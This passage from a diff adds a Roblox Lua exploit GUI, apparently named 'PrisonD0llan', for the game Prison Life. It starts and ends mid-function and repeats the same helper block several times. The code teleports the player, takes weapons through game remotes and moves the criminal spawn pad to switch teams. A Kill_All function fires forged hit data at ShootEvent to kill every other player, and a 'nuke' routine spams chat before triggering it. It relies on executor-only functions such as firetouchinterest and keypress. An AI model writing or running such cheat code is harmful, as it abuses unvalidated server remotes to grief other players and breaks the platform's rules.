+		end
+		Resfreshing = true
+		local Goto = Pos or getpos()
+		local Connections = {}
+		local Cam = workspace.CurrentCamera.CFrame
+		Connections[1] = plr.CharacterAdded:Connect(function(charnew)
+			pcall(function()
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = Cam
+					end
+				end)
+				repeat task.wait() until charnew and charnew:FindFirstChild("HumanoidRootPart")
+				MoveTo(Goto)
+				task.spawn(function()
+					wait(.05)
+					MoveTo(Goto)
+					Resfreshing = false
+				end)
+				Connections[1]:Disconnect()
+			end)
+		end)
+		loadchar()
+		print("Refreshed")
+		return
+	end
+
+	function Kill_All(TeamS)
+		local a = GetTeam()
+		local saved = getpos()
+		local Team = GetTeam()
+		if not TeamS then
+			ChangeTeam(game.Teams.Inmates)
+		end
+		GetGun("M9")
+		repeat task.wait() until plr.Backpack:FindFirstChild("M9")
+		local Gun = plr.Backpack:FindFirstChild("M9")
+		local Gen = {}
+		if TeamS then
+			if TeamS == game.Teams.Guards then
+				ChangeTeam(game.Teams.Inmates)
+			elseif TeamS == game.Teams.Inmates then
+				ChangeTeam(game.Teams.Criminals)
+			end
+		end
+		if not TeamS then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if  v ~= plr then
+					if v.Team == game.Teams.Criminals then
+						for i =1,10 do
+							Gen[#Gen+1]={
+								["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+								["Distance"] = .1,
+								["Cframe"] = CFrame.new(),
+								["Hit"] = v.Character:WaitForChild("Head")
+							}
+						end
+					end
+				end
+			end
+			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		end
+		--
+		if not TeamS then
+			ChangeTeam(game.Teams.Criminals)
+		end
+		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+			if  v ~= plr then
+				if (TeamS and v.Team == TeamS) or not TeamS then
+					for i =1,10 do
+						Gen[#Gen+1]={
+							["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+							["Distance"] = .1,
+							["Cframe"] = CFrame.new(),
+							["Hit"] = v.Character:WaitForChild("Head")
+						}
+					end
+				end
+			end
+		end
+		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		wait(.1)
+		Last_Team(a)
+		wait(.4)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+	end
+	local function givenukeTo(plrRRr)
+		if plrRRr then
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!A NUKE HAS BEEN PLACED ON "..plrRRr.Name.." KILLING HIM WILL GET EVERYONE DEAD!!!", "ALL")
+			repeat task.wait()
+				if plrRRr.Character and plrRRr.Character:FindFirstChildOfClass("Humanoid") and plrRRr.Character:FindFirstChildOfClass("Humanoid").Health <1 then
+					break
+				end
+			until not game
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrRRr.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
+			wait(1.5)
+			--//This is what I call perfect work 
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 3", "ALL")
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 2", "ALL")			
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 1", "ALL")
+			wait(2)
+			Kill_All()
+		end
+	end
+	script.Parent.MouseButton1Click:Connect(function()
+		plr.CharacterAdded:Connect(function()
+			if script.Parent.Parent.Parent.Parent.Parent then
+				if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 643697197) then
+					GetGun("Riot Shield")
+				end
+			end
+		end)
+	end)
+end;
+task.spawn(C_f1);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+local function C_f3()
+	local script = G2L["f3"];
+	firetouchinterest=firetouchinterest
+
+	local plr =  game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
+	function GetGun(Item,Ignore)
+		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
+		if workspace.Prison_ITEMS.giver:FindFirstChild(Item) and workspace.Prison_ITEMS.giver:FindFirstChild(Item):FindFirstChild("ITEMPICKUP") then
+			Item =workspace.Prison_ITEMS.giver:FindFirstChild(Item)
+			local ohInstance1 = Item:FindFirstChildOfClass("Part")
+			MoveTo(CFrame.new(ohInstance1.Position))
+			repeat wait()
+				local ohInstance1 = Item:FindFirstChildOfClass("Part")
+				MoveTo(CFrame.new(ohInstance1.Position))
+				task.spawn(function()
+					workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
+				end)
+				wait()
+			until plr.Backpack:FindFirstChild(Item.Name) or plr.Character:FindFirstChild(Item.Name)
+		end
+		if Ignore ~= true then
+			plr.Character:SetPrimaryPartCFrame(Ignore or saved)
+		end
+	end
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	local function GetPlayer(String)
+		if not String then return end
+		local Yes = {}
+		for _, Player in ipairs(game.Players:GetPlayers()) do
+			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
+				table.insert(Yes, Player)
+			end
+		end
+		if #Yes > 0 then
+			return Yes[1]
+		elseif #Yes < 1 then
+			return nil
+		end
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	function Valid_Team(Team)
+		if Team and typeof(Team):lower()=="string" then
+			local Valid = {
+				"Bright orange",
+				"Bright blue",
+			}
+			if table.find(Valid,Team) then
+				return true
+			elseif Team == "Really red" then
+				return 1
+			end
+			return nil
+		end
+	end
+	function Last_Team(Lastteam)
+		task.spawn(function()
+			local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+			a =plr.CharacterAdded:Connect(function(Char)
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = c
+					end
+				end)
+				Char:WaitForChild("HumanoidRootPart")
+				MoveTo(b)
+				a:Disconnect()
+			end)
+			local Team = Valid_Team(Lastteam)
+			if Team and Team~=1 then
+				local pos = getpos()
+				workspace.Remote.TeamEvent:FireServer(Lastteam)
+			elseif Team and Team == 1 then
+				workspace.Remote.TeamEvent:FireServer("Bright orange")
+				local crimpad = workspace["Criminals Spawn"].SpawnLocation
+				crimpad.CanCollide = false
+				crimpad.Transparency = 1
+				repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+				MoveToJunk(crimpad)
+			end
+		end)
+	end
+	loadchar = function()
+		if plr.Team == game.Teams.Inmates then
+			local ohString1 = "Bright orange"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Guards then
+
+			local ohString1 = "Bright blue"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Criminals then
+			workspace.Remote.TeamEvent:FireServer("Bright orange")
+			wait(.3)
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			MoveToJunk(crimpad)
+		end
+	end
+	local Resfreshing = false
+	function refresh(Pos)
+		if not Pos then
+			Pos = getpos()
+		end
+		Resfreshing = true
+		local Goto = Pos or getpos()
+		local Connections = {}
+		local Cam = workspace.CurrentCamera.CFrame
+		Connections[1] = plr.CharacterAdded:Connect(function(charnew)
+			pcall(function()
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = Cam
+					end
+				end)
+				repeat task.wait() until charnew and charnew:FindFirstChild("HumanoidRootPart")
+				MoveTo(Goto)
+				task.spawn(function()
+					wait(.05)
+					MoveTo(Goto)
+					Resfreshing = false
+				end)
+				Connections[1]:Disconnect()
+			end)
+		end)
+		loadchar()
+		print("Refreshed")
+		return
+	end
+
+	function Kill_All(TeamS)
+		local a = GetTeam()
+		local saved = getpos()
+		local Team = GetTeam()
+		if not TeamS then
+			ChangeTeam(game.Teams.Inmates)
+		end
+		GetGun("M9")
+		repeat task.wait() until plr.Backpack:FindFirstChild("M9")
+		local Gun = plr.Backpack:FindFirstChild("M9")
+		local Gen = {}
+		if TeamS then
+			if TeamS == game.Teams.Guards then
+				ChangeTeam(game.Teams.Inmates)
+			elseif TeamS == game.Teams.Inmates then
+				ChangeTeam(game.Teams.Criminals)
+			end
+		end
+		if not TeamS then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if  v ~= plr then
+					if v.Team == game.Teams.Criminals then
+						for i =1,10 do
+							Gen[#Gen+1]={
+								["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+								["Distance"] = .1,
+								["Cframe"] = CFrame.new(),
+								["Hit"] = v.Character:WaitForChild("Head")
+							}
+						end
+					end
+				end
+			end
+			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		end
+		--
+		if not TeamS then
+			ChangeTeam(game.Teams.Criminals)
+		end
+		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+			if  v ~= plr then
+				if (TeamS and v.Team == TeamS) or not TeamS then
+					for i =1,10 do
+						Gen[#Gen+1]={
+							["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+							["Distance"] = .1,
+							["Cframe"] = CFrame.new(),
+							["Hit"] = v.Character:WaitForChild("Head")
+						}
+					end
+				end
+			end
+		end
+		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		wait(.1)
+		Last_Team(a)
+		wait(.4)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+	end
+	local function givenukeTo(plrRRr)
+		if plrRRr then
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!A NUKE HAS BEEN PLACED ON "..plrRRr.Name.." KILLING HIM WILL GET EVERYONE DEAD!!!", "ALL")
+			repeat task.wait()
+				if plrRRr.Character and plrRRr.Character:FindFirstChildOfClass("Humanoid") and plrRRr.Character:FindFirstChildOfClass("Humanoid").Health <1 then
+					break
+				end
+			until not game
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrRRr.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
+			wait(1.5)
+			--//This is what I call perfect work 
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 3", "ALL")
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 2", "ALL")			
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 1", "ALL")
+			wait(2)
+			Kill_All()
+		end
+	end
+	script.Parent.MouseButton1Click:Connect(function()
+		local ContextActionService = game:GetService("ContextActionService")
+
+		local function collectTreasure(actionName, inputState, inputObject)
+			if inputState == Enum.UserInputState.Begin and actionName == "punch" then
+				keypress("0x46")
+			end
+		end
+
+		ContextActionService:BindAction("punch", collectTreasure, true, Enum.KeyCode.T, Enum.KeyCode.ButtonR1)
+		ContextActionService:SetPosition("punch", UDim2.new(1, -70, 0, 10))
+		ContextActionService:SetTitle("punch", "Punch")
+	end)
+end;
+task.spawn(C_f3);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+local function C_f4()
+	local script = G2L["f4"];
+	firetouchinterest=firetouchinterest
+
+	local plr =  game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
+	function GetGun(Item,Ignore)
+		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
+		if workspace.Prison_ITEMS.giver:FindFirstChild(Item) and workspace.Prison_ITEMS.giver:FindFirstChild(Item):FindFirstChild("ITEMPICKUP") then
+			Item =workspace.Prison_ITEMS.giver:FindFirstChild(Item)
+			local ohInstance1 = Item:FindFirstChildOfClass("Part")
+			MoveTo(CFrame.new(ohInstance1.Position))
+			repeat wait()
+				local ohInstance1 = Item:FindFirstChildOfClass("Part")
+				MoveTo(CFrame.new(ohInstance1.Position))
+				task.spawn(function()
+					workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
+				end)
+				wait()
+			until plr.Backpack:FindFirstChild(Item.Name) or plr.Character:FindFirstChild(Item.Name)
+		end
+		if Ignore ~= true then
+			plr.Character:SetPrimaryPartCFrame(Ignore or saved)
+		end
+	end
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	local function GetPlayer(String)
+		if not String then return end
+		local Yes = {}
+		for _, Player in ipairs(game.Players:GetPlayers()) do
+			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
+				table.insert(Yes, Player)
+			end
+		end
+		if #Yes > 0 then
+			return Yes[1]
+		elseif #Yes < 1 then
+			return nil
+		end
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	function Valid_Team(Team)
+		if Team and typeof(Team):lower()=="string" then
+			local Valid = {
+				"Bright orange",
+				"Bright blue",
+			}
+			if table.find(Valid,Team) then
+				return true
+			elseif Team == "Really red" then
+				return 1
+			end
+			return nil
+		end
+	end
+	function Last_Team(Lastteam)
+		task.spawn(function()
+			local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+			a =plr.CharacterAdded:Connect(function(Char)
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = c
+					end
+				end)
+				Char:WaitForChild("HumanoidRootPart")
+				MoveTo(b)
+				a:Disconnect()
+			end)
+			local Team = Valid_Team(Lastteam)
+			if Team and Team~=1 then
+				local pos = getpos()
+				workspace.Remote.TeamEvent:FireServer(Lastteam)
+			elseif Team and Team == 1 then
+				workspace.Remote.TeamEvent:FireServer("Bright orange")
+				local crimpad = workspace["Criminals Spawn"].SpawnLocation
+				crimpad.CanCollide = false
+				crimpad.Transparency = 1
+				repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+				MoveToJunk(crimpad)
+			end
+		end)
+	end
+	loadchar = function()
+		if plr.Team == game.Teams.Inmates then
+			local ohString1 = "Bright orange"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Guards then
+
+			local ohString1 = "Bright blue"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Criminals then
+			workspace.Remote.TeamEvent:FireServer("Bright orange")
+			wait(.3)
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			MoveToJunk(crimpad)
+		end
+	end
+	local Resfreshing = false
+	function refresh(Pos)
+		if not Pos then
+			Pos = getpos()
+		end
+		Resfreshing = true
+		local Goto = Pos or getpos()
+		local Connections = {}
+		local Cam = workspace.CurrentCamera.CFrame
+		Connections[1] = plr.CharacterAdded:Connect(function(charnew)
+			pcall(function()
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = Cam
+					end
+				end)
+				repeat task.wait() until charnew and charnew:FindFirstChild("HumanoidRootPart")
+				MoveTo(Goto)
+				task.spawn(function()
+					wait(.05)
+					MoveTo(Goto)
+					Resfreshing = false
+				end)
+				Connections[1]:Disconnect()
+			end)
+		end)
+		loadchar()
+		print("Refreshed")
+		return
+	end
+
+	function Kill_All(TeamS)
+		local a = GetTeam()
+		local saved = getpos()
+		local Team = GetTeam()
+		if not TeamS then
+			ChangeTeam(game.Teams.Inmates)
+		end
+		GetGun("M9")
+		repeat task.wait() until plr.Backpack:FindFirstChild("M9")
+		local Gun = plr.Backpack:FindFirstChild("M9")
+		local Gen = {}
+		if TeamS then
+			if TeamS == game.Teams.Guards then
+				ChangeTeam(game.Teams.Inmates)
+			elseif TeamS == game.Teams.Inmates then
+				ChangeTeam(game.Teams.Criminals)
+			end
+		end
+		if not TeamS then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if  v ~= plr then
+					if v.Team == game.Teams.Criminals then
+						for i =1,10 do
+							Gen[#Gen+1]={
+								["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+								["Distance"] = .1,
+								["Cframe"] = CFrame.new(),
+								["Hit"] = v.Character:WaitForChild("Head")
+							}
+						end
+					end
+				end
+			end
+			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		end
+		--
+		if not TeamS then
+			ChangeTeam(game.Teams.Criminals)
+		end
+		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+			if  v ~= plr then
+				if (TeamS and v.Team == TeamS) or not TeamS then
+					for i =1,10 do
+						Gen[#Gen+1]={
+							["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+							["Distance"] = .1,
+							["Cframe"] = CFrame.new(),
+							["Hit"] = v.Character:WaitForChild("Head")
+						}
+					end
+				end
+			end
+		end
+		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		wait(.1)
+		Last_Team(a)
+		wait(.4)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+	end
+	local function givenukeTo(plrRRr)
+		if plrRRr then
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!A NUKE HAS BEEN PLACED ON "..plrRRr.Name.." KILLING HIM WILL GET EVERYONE DEAD!!!", "ALL")
+			repeat task.wait()
+				if plrRRr.Character and plrRRr.Character:FindFirstChildOfClass("Humanoid") and plrRRr.Character:FindFirstChildOfClass("Humanoid").Health <1 then
+					break
+				end
+			until not game
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrRRr.Name.." IS DEAD NUKE LAUNCHING!!!", "ALL")
+			wait(1.5)
+			--//This is what I call perfect work 
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 3", "ALL")
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 2", "ALL")			
+			wait(1.5)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LAUNCHING IN 1", "ALL")
+			wait(2)
+			Kill_All()
+		end
+	end
+	script.Parent.MouseButton1Click:Connect(function()
+		local ContextActionService = game:GetService("ContextActionService")
+
+		local function collectTreasure(actionName, inputState, inputObject)
+			if inputState == Enum.UserInputState.Begin and actionName == "crawl" then
+				keypress("0x43")
+			end
+		end
+
+		ContextActionService:BindAction("crawl", collectTreasure, true, Enum.KeyCode.T, Enum.KeyCode.ButtonR1)
+		ContextActionService:SetPosition("crawl", UDim2.new(1, -70, 0, -50))
+		ContextActionService:SetTitle("crawl", "Crawl")
+	end)
+end;
+task.spawn(C_f4);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+local function C_f6()
+	local script = G2L["f6"];
+	while true do
+		for i = 1, 360 do
+			script.Parent.BorderColor3 = Color3.fromHSV(i / 360, 1, 1)
+			task.wait()
+		end
+	end
+end;
+task.spawn(C_f6);
+-- StarterGui.PrisonD0llan.Title.mainFrame.LocalPlayer_page[4].TextButton.LocalScript
+local function C_f7()
+	local script = G2L["f7"];
+	firetouchinterest=firetouchinterest
+
+	local plr =  game.Players.LocalPlayer
+	function MoveToJunk(v)
+		v.CFrame = CFrame.new(0,5^5,0)
+	end
+	function GetGun(Item,Ignore)
+		local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
+		if workspace.Prison_ITEMS.giver:FindFirstChild(Item) and workspace.Prison_ITEMS.giver:FindFirstChild(Item):FindFirstChild("ITEMPICKUP") then
+			Item =workspace.Prison_ITEMS.giver:FindFirstChild(Item)
+			local ohInstance1 = Item:FindFirstChildOfClass("Part")
+			MoveTo(CFrame.new(ohInstance1.Position))
+			repeat wait()
+				local ohInstance1 = Item:FindFirstChildOfClass("Part")
+				MoveTo(CFrame.new(ohInstance1.Position))
+				task.spawn(function()
+					workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
+				end)
+				wait()
+			until plr.Backpack:FindFirstChild(Item.Name) or plr.Character:FindFirstChild(Item.Name)
+		end
+		if Ignore ~= true then
+			plr.Character:SetPrimaryPartCFrame(Ignore or saved)
+		end
+	end
+	local function getpos()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end
+
+	local function GetCamPos()
+		return workspace.CurrentCamera.CFrame
+	end
+
+	local function GetTeam()
+		return game.Players.LocalPlayer.TeamColor.Name
+	end
+	local function GetPlayer(String)
+		if not String then return end
+		local Yes = {}
+		for _, Player in ipairs(game.Players:GetPlayers()) do
+			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
+				table.insert(Yes, Player)
+			end
+		end
+		if #Yes > 0 then
+			return Yes[1]
+		elseif #Yes < 1 then
+			return nil
+		end
+	end
+	function unsit()
+		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
+	end
+	function MoveTo(Pos,t)
+		unsit()
+		pcall(function()
+			if typeof(Pos):lower() == "position" then
+				Pos = CFrame.new(Pos)
+			end
+			for i =1,3 do
+				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = Pos
+			end
+		end)
+	end
+	function ChangeTeam(Team)
+		if Team == game.Teams.Criminals then
+			local pos = getpos()
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			wait()
+			MoveTo(pos)
+			MoveToJunk(crimpad)
+			return
+		end
+		local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+		a =plr.CharacterAdded:Connect(function(Char)
+			task.spawn(function()
+				workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+				for i =1,5 do
+					workspace.CurrentCamera.CFrame = c
+				end
+			end)
+			Char:WaitForChild("HumanoidRootPart")
+			MoveTo(b)
+			a:Disconnect()
+		end)
+		local ohString1 = Team.TeamColor.Name
+		workspace.Remote.TeamEvent:FireServer(ohString1)
+		return
+	end
+	function Valid_Team(Team)
+		if Team and typeof(Team):lower()=="string" then
+			local Valid = {
+				"Bright orange",
+				"Bright blue",
+			}
+			if table.find(Valid,Team) then
+				return true
+			elseif Team == "Really red" then
+				return 1
+			end
+			return nil
+		end
+	end
+	function Last_Team(Lastteam)
+		task.spawn(function()
+			local a,b,c= nil,getpos(),workspace.CurrentCamera.CFrame
+			a =plr.CharacterAdded:Connect(function(Char)
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = c
+					end
+				end)
+				Char:WaitForChild("HumanoidRootPart")
+				MoveTo(b)
+				a:Disconnect()
+			end)
+			local Team = Valid_Team(Lastteam)
+			if Team and Team~=1 then
+				local pos = getpos()
+				workspace.Remote.TeamEvent:FireServer(Lastteam)
+			elseif Team and Team == 1 then
+				workspace.Remote.TeamEvent:FireServer("Bright orange")
+				local crimpad = workspace["Criminals Spawn"].SpawnLocation
+				crimpad.CanCollide = false
+				crimpad.Transparency = 1
+				repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+				MoveToJunk(crimpad)
+			end
+		end)
+	end
+	loadchar = function()
+		if plr.Team == game.Teams.Inmates then
+			local ohString1 = "Bright orange"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Guards then
+
+			local ohString1 = "Bright blue"
+			workspace.Remote.TeamEvent:FireServer(ohString1)
+		elseif plr.Team == game.Teams.Criminals then
+			workspace.Remote.TeamEvent:FireServer("Bright orange")
+			wait(.3)
+			local crimpad = workspace["Criminals Spawn"].SpawnLocation
+			crimpad.CanCollide = false
+			crimpad.Transparency = 1
+			repeat task.wait()crimpad.CFrame = getpos() until plr.Team == game.Teams.Criminals
+			MoveToJunk(crimpad)
+		end
+	end
+	local Resfreshing = false
+	function refresh(Pos)
+		if not Pos then
+			Pos = getpos()
+		end
+		Resfreshing = true
+		local Goto = Pos or getpos()
+		local Connections = {}
+		local Cam = workspace.CurrentCamera.CFrame
+		Connections[1] = plr.CharacterAdded:Connect(function(charnew)
+			pcall(function()
+				task.spawn(function()
+					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
+					for i =1,5 do
+						workspace.CurrentCamera.CFrame = Cam
+					end
+				end)
+				repeat task.wait() until charnew and charnew:FindFirstChild("HumanoidRootPart")
+				MoveTo(Goto)
+				task.spawn(function()
+					wait(.05)
+					MoveTo(Goto)
+					Resfreshing = false
+				end)
+				Connections[1]:Disconnect()
+			end)
+		end)
+		loadchar()
+		print("Refreshed")
+		return
+	end
+
+	function Kill_All(TeamS)
+		local a = GetTeam()
+		local saved = getpos()
+		local Team = GetTeam()
+		if not TeamS then
+			ChangeTeam(game.Teams.Inmates)
+		end
+		GetGun("M9")
+		repeat task.wait() until plr.Backpack:FindFirstChild("M9")
+		local Gun = plr.Backpack:FindFirstChild("M9")
+		local Gen = {}
+		if TeamS then
+			if TeamS == game.Teams.Guards then
+				ChangeTeam(game.Teams.Inmates)
+			elseif TeamS == game.Teams.Inmates then
+				ChangeTeam(game.Teams.Criminals)
+			end
+		end
+		if not TeamS then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if  v ~= plr then
+					if v.Team == game.Teams.Criminals then
+						for i =1,10 do
+							Gen[#Gen+1]={
+								["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+								["Distance"] = .1,
+								["Cframe"] = CFrame.new(),
+								["Hit"] = v.Character:WaitForChild("Head")
+							}
+						end
+					end
+				end
+			end
+			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Gen, Gun)
+		end
+		--
+		if not TeamS then
+			ChangeTeam(game.Teams.Criminals)
+		end
+		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+			if  v ~= plr then
